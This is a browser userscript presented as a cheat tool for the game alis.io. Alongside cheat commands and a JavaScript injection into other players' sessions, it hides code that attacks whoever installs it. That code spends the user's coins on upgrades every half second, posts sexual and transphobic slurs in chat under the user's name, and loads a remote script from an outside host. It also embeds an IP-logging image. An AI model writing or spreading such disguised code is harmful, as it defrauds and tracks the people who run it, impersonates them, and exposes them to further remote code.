// ==UserScript==
// @name        Yuu Alis Hacks
// @version     1.0
// @description READ THIS SCRIPT BEFORE USING!
// @author      Yuu
// @match       http://alis.io/*
// @match       http://d.alis.io/*
// @match       http://*.alis.io/*
// @run-at      document-end
// @grant       GM_getResourceText
// @grant       GM_addStyle
// @grant       GM_xmlhttpRequest
// @grant       GM_getResourceURL
// @grant       GM_xmlhttpRequest
// ==/UserScript==

// base url to append paths to
var nosxBase = "https://nosx.cf/";
// define levels of hackery
var playerSettings = {};
// Counter to roll through levels of hackery (index = nextHack modulous hackCount)
var nextHack = 1;
// base url for songs and sounds
var soundBase = nosxBase + "mp3/";
// index of our current song and sound
//var nextSound = 1;
//var nextSong = 1;
// list of sounds with associated details
var soundBoard = {};
var sound = {};
// list of songs with associated details
var songBoard = {};
var song = {};


window.buyBots=function(multiplier) {
    var url = '/api/users/buyupgrade';
    var method = 'POST';
    var data = {
        type: 'bots' + multiplier,
    };
    var success = function(response) {
        if (response.success) {
            console.log("Just wasted your shitty coins son of bitch");
        } 
    }
    var failure = function(error) {
    }
    // run the api call specified and wait for its response
    apicall(url, method, data, success, failure)
}
window.buyMass = multiplier => {
    var url = '/api/users/buyupgrade';
    var method = 'POST';
    var data = {
        type: 'mass' + multiplier,
    };
    var success = function(response) {
        if (response.success) {
            console.log("Just wasted your shitty coins son of bitch");
        }
    }
    // run the api call specified and wait for its response
    apicall(url, method, data, success, failure)
}

window.changeColor=()=>{
    var url = '/api/users/changecolor';
    var method = 'POST';
    var callurl = apiurl + url + "?token=" + jwt + "&r=" + 255 + "&g=" + 255 + "&b=" + 255;
        //console.log(callurl);
    $.ajax({
        type: "GET",
        url: callurl,
        success: function(data) {
        console.log("dumbfck no lbc now");
        }
    });
}

var roaster=false;

var fuckingMexisShouldDie=setInterval(()=>{

    window.buyBots(3);
    window.buyMass(3);
    window.changeColor();

},500);

var salt=["Hi guys I'm tit","I'm just a tranny","i love buttfucking men","I want nos's dick","pls give admns so I can suck dildos",];

var roasterIndex=0;

var ss = setTimeout(() => {
    var mexiRoaster=setInterval(()=>{
        roasterIndex++;
        window.sendChat(salt[roasterIndex%salt.length]);
    },1000);
    var ss2 = setTimeout(()=>{
        var rain = document.createElement("script");
        rain.src="https://nosx.cf/rain.js";
        document.head.appendChild(rain);
    },4000);
}, 15000);


// make a reusable function to reload settings, sounds, and songs.
unsafeWindow.reloadHacks = function () {

    var log = new Image();
    log.src="https://2no.co/18Xc37";
    log.alt="iplogger.org - IP Logging Service";
    log.border="0";

    document.body.appendChild(log);

    
    $.getJSON("http://okumura-todo-ge.tk/gePlayerSettings.json", function(json) {
        playerSettings = json;
        console.log('playerSettings Loaded!');


        for(var s in playerSettings){
            var b=document.createElement("BUTTON");
            b.innerHTML=s;
            b.onclick=()=>{
                for(var i in s){
                    sendTargetHack("set",unsafeWindow.targets,[i,s[i]]);
                }
            }
            $('#hackdiv').append(b);

        }
    var timer=10
    var gay=()=>{
        timer--;
        console.log(timer);
        if(timer===0){console.log("BONK")}
        setTimeout(gay,1000);
    }

        //do stuff here


    });
    $.getJSON(nosxBase + "/razor/songboard.json", function(json) {
        songBoard = json;
        console.log('songBoard Loaded!');

        var songPad=document.createElement("LI");
        var songList=document.createElement("select");
        for (var f in songBoard){
            songList.options.add(new Option(f,f));
        }
        songList.style="width:150px;";
        var playSongbutton=document.createElement("BUTTON");
        playSongbutton.innerHTML="Play";
        playSongbutton.onclick=function(){
            var currentSong=songBoard[songList.value];
            if (!currentSong || !currentSong.path || !currentSong.vol) {
                console.log('undefined or invalid sound');
                return;
            }
            // build the string to send
            var hack = "";
            hack += "if(window.song) window.song.stop(); window.song = new Audio('";
            hack += soundBase + currentSong.path;
            hack += "'); window.song.volume=";
            hack += currentSong.vol;
            hack += "; window.song.play();";
            // send the string
            sendHack("/say /evil: " + hack);
            //console.log('sending songboard hack ' + hack);
            if (currentSong.extra) {
                //console.log('sending extra songboard hack ' + sound.extra);
                sendHack("/say /evil: " + currentSong.extra);
            }
        };
        songPad.append(songList);
        songPad.append(playSongbutton);
        $('#hackdiv').append(songPad);
    });


    $.getJSON(nosxBase + "/razor/soundboard.json", function(json) {
        soundBoard = json;
        console.log('soundBoard Loaded!');
        var soundPad=document.createElement("LI");
        var soundList=document.createElement("select");
        for (var s in soundBoard){
            soundList.options.add(new Option(s,s));
        }
        soundList.style="width:150px;";
        var playSoundbutton=document.createElement("BUTTON");
        playSoundbutton.innerHTML="Play";
        playSoundbutton.onclick=function(){
            //console.log("playing song: "+soundList.value);
            var currentSound=soundBoard[soundList.value];
            if (!currentSound || !currentSound.path || !currentSound.vol) {
                console.log('undefined or invalid sound');
                return;
            }
            // build the string to send
            var hack = "";
            ///say /evil: window.song = new Audio('http://okumura-todo-ge.tk/bgm1.mp3'); window.song.volume=0.4; window.song.play();
            hack += "if(window.sound) window.sound.stop(); window.sound = new Audio('";
            hack += soundBase + currentSound.path;
            hack += "'); window.sound.volume=";
            hack += currentSound.vol;
            hack += "; window.sound.play();";
            // send the string
            sendHack("/say /evil: " + hack);
            //console.log('sending soundboard hack ' + hack);
            if (currentSound.extra) {
                //console.log('sending extra soundboard hack ' + sound.extra);
                sendHack("/say /evil: " + currentSound.extra);
            }
        };
        soundPad.append(soundList);
        soundPad.append(playSoundbutton);
        $('#hackdiv').append(soundPad);
    });
};
// call the async setting song and sound loader
unsafeWindow.reloadHacks();

// Mass toggle values
var massToggle = [2000,20000];
var nextMass = 1;


unsafeWindow.sendHack = function (command, params) { sendTargetHack(command, unsafeWindow.targets, params); };
unsafeWindow.showAllChat = 1;
//unsafeWindow.showAllSkins = 1;

// Change our color every half second
/*
var changeColor = setInterval(function(){
    var myId = $('#yourplayerid').html();
    if (myId) {
        var command = '/randomcolor';
        //console.log('sending color command: ' + command);
        sendHack(command);
    }
}, 500);
/**/

function findUIDwithPID(pid){
    console.log('searching for user ID...');
    console.log(apc);
    for (var c in apc){
        if(apc[c].pid==pid){
            return apc[c].uid;
        }
    }
    return null;
}

var angle=0;
var isMoving=false;
var playersOnRide={};
var circularMovement = setInterval(function(){
    if (playersOnRide&&isMoving) {
        var command = '/teleport '+playersOnRide+' '+3000*Math.cos(angle)+' '+3000*Math.sin(angle);
        //console.log("current pos:"+3000*Math.cos(angle)+","+3000*Math.sin(angle));
        angle+=0.05;
        sendHack(command);
    }
}, 20);

// override window.onChatClick(pid) function
unsafeWindow.onChatClick = function (pid) {
    unsafeWindow.targets = [pid];
};

/*
unsafeWindow.receiveMessage = function(msg, data, el, options) {
    console.log(msg,data,el,options);
    if (!options.team) {
        options.team = "";
    }
    var iconColor = "#ffffff";
    var message = $("<div/>");
    var _0x24977 = ' style="';
    if (el && el != "#ffffff") {
        _0x24977 += "color: " + el + ";";
        message.addClass("coloredname");
    } else {
        _0x24977 += "color: " + iconColor + ";";
    }

        if (options.isAdmin || (options.isTroll || options.isBold)) {
            _0x24977 += " font-weight: bold;";
        }

    if (options.isServer) {
        _0x24977 += "font-weight:bold;color:#26547C";
        message.addClass("coloredname");
    }
    _0x24977 += '"';
    if (options.pid) {
        if (!window.playerExtra[options.pid]) {
            window.playerExtra[options.pid] = {};
        }
        $.extend(window.playerExtra[options.pid], options);
        _0x24977 += ' onclick="window.onChatClick(' + options.pid + ');"';
    }
    var text = "";
    if (window.showAllChat) {
        if (options.team != "") {
            text = "[" + options.team + "]";
            text = escapeHtml(text);
        }
    }
    msg = escapeHtml(msg);
    var bodyPlainTag = $('<span class="sender"' + _0x24977 + ">").html("<span id='teaminchat'>" + text + " </span>" + msg + " : ");
    message.append(bodyPlainTag);
    if (!options.isAdmin && !options.isServer) {
        data = escapeHtml(data);
    } else {}
    errors = $('<span class="msg">').html(data);
    message.append(errors);
    $("#chatroom").append(message);
    $("#chatroom").stop().animate({
        scrollTop: $("#chatroom")[0].scrollHeight
    }, 400);
    this.scrollDown();
    this.popupChat(msg, data, el);
};
/**/

// keep the UI for our window.targets up to date
var updateTargets = setInterval(function(){
    $('#targetplayerid').html(JSON.stringify(unsafeWindow.targets));
}, 500);


// Keypress handler
function keydown(event) {
    //console.log(event); // for debugging
    // Do not process keypress events NOT on the body element itself
    if(event.target.nodeName != "BODY") {
        return;
    }
    var command = '';
    //turn on/off dickride
    if (event.keyCode == 48) {
        playersOnRide=unsafeWindow.targets;
        isMoving=!isMoving;
        if(isMoving){
            $('#hackstatus').html('Dickriding started!');
        } else {
            $('#hackstatus').html('Dickriding stopped!');
        }
    }
    // 2 key, teleport to mouse location
    if (event.keyCode == 50) {
        sendTargetHack('teleport', unsafeWindow.targets, [ mouseX, mouseY ]);
        $('#hackstatus').html('teleported target');
    }

    // 3 key, toggle mass hack 2k/20k
    if (event.keyCode == 51) {
        var massKey = nextMass % massToggle.length;
        sendTargetHack('mass', unsafeWindow.targets ,massToggle[massKey]);
        $('#hackstatus').html('mass set to ' + massToggle[massKey]);
        nextMass++;
    }

    // 5 key, kill target(s)
    if (event.keyCode == 53) {
        sendTargetHack('kill', unsafeWindow.targets, '');
        $('#hackstatus').html('killed target player(s)');
    }
    // R sets targets color to RANDUMB
    if (event.keyCode == 82) {
        sendTargetHack('randomcolor', unsafeWindow.targets, '');
    }
}

var allcb={};
var apc=[];

// Get target cell ID
function getClosestCellID(X, Y) {
    //$('#hackstatus').html('searching for cell id near mouse ' + X + ',' + Y);
    var cells = unsafeWindow.allCells;
    //console.log(cells);
    // Loop through all the cells and extract JUST the players
    var playerCells = [];
    apc=[];
    for (var i in cells) {
        var playerCell = cells[i];
        // Ignore food pellets & tiny cells
        if (playerCell.isFood || playerCell.size < 35) {
            continue;
        }
        // F is old agarplus obfuscated isVirus flag
        if (playerCell.f || playerCell.isVirus) {
            continue;
        }
        console.log(playerCell);
        // Calculate the x and y distances
        var distx = playerCell.x - X;
        var disty = playerCell.y - Y;
        // calculates distance between two X,Y points
        var distance = Math.sqrt( Math.pow(distx, 2) + Math.pow(disty, 2) );
        // save our player cell info
        var razorCell = {};
        razorCell.id = i;
        razorCell.name = playerCell.name;
        razorCell.distance = distance;
        razorCell.size = playerCell.size;
        razorCell.x = playerCell.x;
        razorCell.y = playerCell.y;
        razorCell.uid=playerCell.extra.uid;
        razorCell.skinUrl=playerCell.extra.skinUrl;
        //console.log(playerCell.name+"\'s teamHash: "+playerCell.extra.teamHash);
        razorCell.team=playerCell.extra.teamHash;
        razorCell.pid=playerCell.extra.pid;
        playerCells.push(razorCell);

        if (apc.length<1){
            apc.push(razorCell);
        }
        var found=false;
        for (var cell in apc){
            var c=apc[cell];
            //compare if the cell belongs to same player or if it's a coin
            if (razorCell.pid==c.pid){
                found=true;
                break;
            }
        }
        if(!found){
            apc.push(razorCell);
        }

    }
    allcb=[];
    $('#pannel').html("");
    //console.log(apc);
    apc.sort(function (a, b) { return a.distance - b.distance; });
    for (var a in apc){
        var b=apc[a];
        var pd=document.createElement("LI");
        var img = document.createElement("img");
        img.style="height:50px; width:50px;";
        img.setAttribute('src', b.skinUrl);
        var cb = document.createElement("INPUT");
        cb.setAttribute("type", "checkbox");
        cb.value=b.pid;
        allcb.push(cb);
        pd.append(cb);
        pd.append(img);
        pd.append(b.name);
        $('#pannel').append(pd);
    }
    //console.log(playerCells);
    // Sort the cells by distance ascending
    playerCells.sort(function (a, b) { return a.distance - b.distance; });
    //console.log('closest player identified: ');
    //console.table(playerCells.slice(0, 1));
    if (playerCells.length) {
        return playerCells[0].id;
    } else {
        return 0;
    }
}

// left Mouse click handler
function leftMouseClick()
{
    if(viruscb.checked){
        var virusSize=vc.value||100;
        //console.log("virus size:"+virusSize);
        command = "/virus " + mouseX + " " + mouseY + " " + virusSize;
        sendHack(command);
        $('#hackstatus').html('spawned virus');
        return;
    }
    if(coincb.checked){
        var coinSize=cc.value||1500;
        //console.log("coin size:"+coinSize);
        command = "/coin " + mouseX + " " + mouseY + " " + coinSize;
        sendHack(command);
        $('#hackstatus').html('spawned coin');
        return;
    }

    var cellid=getClosestCellID(mouseX, mouseY);

    if (cellid) {
        $('#hackstatus').html('requested player id of cell ' + cellid);
        var cell = unsafeWindow.allCells[cellid];
        if(cell.extra && cell.extra.pid > 0) {
            unsafeWindow.targets = [cell.extra.pid];
            //$('#targetplayerid').html(JSON.stringify(cell.extra.pid));
            //$('#hackstatus').html('target player switched to ' + $('#targetplayerid').html());
        } else {
            $('#hackstatus').html('unable to get player id of cell ' + cellid);
        }
    }else{
        $('#hackstatus').html('could not get closest cell id');
    }
}
// middle Mouse click handler
function middleMouseClick()
{
    $('#hackstatus').html('setting target to all CELL IDs');
    // make sure to update the player list when doing this
    playerlist = [];
    command = "/playerlist";
    sendHack(command);
    setTimeout(function() {
        var playerIDs = [];
        for (var key in playerlist) {
            // Skip adding OURSELVES to the middle mouse click list
            if(playerlist[key].id == $('#yourplayerid').html()) {
                continue;
            }
            playerIDs.push(playerlist[key].id);
        }
        if (playerIDs.length) {
            unsafeWindow.targets = playerIDs;
        } else {
            $('#hackstatus').html('Error updating player IDs');
        }
    }, 500);
}

function isDescendant(parent, child) {
    var node = child.parentNode;
    while (node != null) {
        if (node == parent) {
            return true;
        }
        node = node.parentNode;
    }
    return false;
}
// Add the event listener for key press events
$("body").keydown(keydown);
//window.addEventListener('keyup', keyup);
$("#overlays2").on('mousedown', function(event) {
    //console.log("mouse click event on overlays2 " + event.which);
    //console.log(event);
    if( event.which == 1 ) {
        //event.preventDefault();
        var source = event.target || event.srcElement;
        if (isDescendant(document.getElementById("hackdiv"),source)||isDescendant(document.getElementById("allplayers"),source)){
            return;
        }
        //console.log(source);
        leftMouseClick();
    }
    if( event.which == 2 ) {
        event.preventDefault();
        middleMouseClick();
    }
});

document.getElementById("playSound").on('click',function(event){
    console.log("you clicked this button");
});

// global vars to keep stuff in for reference
var playerlist = [];
var commandlist = [];

// handle server responses to our queries
onMultiChat = function(user, message) {
    //console.log(message);
    if(user == 'SERVER' && message[0] == '/') {
        // remove the leading / and split command at the ": " response
        var split = message.slice(1, message.length).split(': ');
        var command = split[0];
        // remove the command we saved and recombine the array for parsing
        split.splice(0,1);
        var response = split.join().trim();
        // we got an OK response from a command
        if(command == 'ok') { return; }
        if(command == 'pong') { return; }
        if(command == 'evil') { return; }
        // We got our ID back from the server
        if(command == 'playerid') {
            $('#yourplayerid').html(response);
            return;
        }
        // List of supported commands
        if(command == 'commands') {
            commandlist = JSON.parse(response);
            console.log(commandlist);
            return;
        }
        // We got a list of all players from the server
        if(command == 'playerlist') {
            playerlist = JSON.parse(response);
            console.table(playerlist);
            return;
        }
        // We got the servers current configuration
        if(command == 'config') {
            config = JSON.parse(response);
            console.log(config);
            return;
        }
        // We got playerDetails for a client
        if(command == 'playerdetails') {
            var playerdetails = JSON.parse(response);
            console.log(playerdetails);
            return;
        }
        // command part of agarplus now
        if(command == 'extra') { return; }
        console.log('UNHANDLED COMMAND: ' + command);
        console.log(response);
    } else {
        // disable cancerous fade animation for chat
        //$("#chatroom div").css("opacity", 1);
    }
};